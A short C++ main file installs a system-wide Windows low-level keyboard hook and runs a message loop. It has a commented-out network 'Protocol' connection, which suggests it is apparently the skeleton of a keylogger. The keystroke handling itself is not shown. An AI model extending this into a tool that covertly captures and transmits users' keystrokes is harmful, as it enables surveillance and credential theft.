#include "KeyBoardClass.h"
#include <iostream>

int main() {
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyBoard::LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

    if (hook == NULL) {
        std::cerr << "Failed to set up hook." << std::endl;
        return 1;
    }

    // Message loop to keep the application running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook and exit
    UnhookWindowsHookEx(hook);

 //   Protocol protocol;
 //   protocol.connection();

    return 0;
}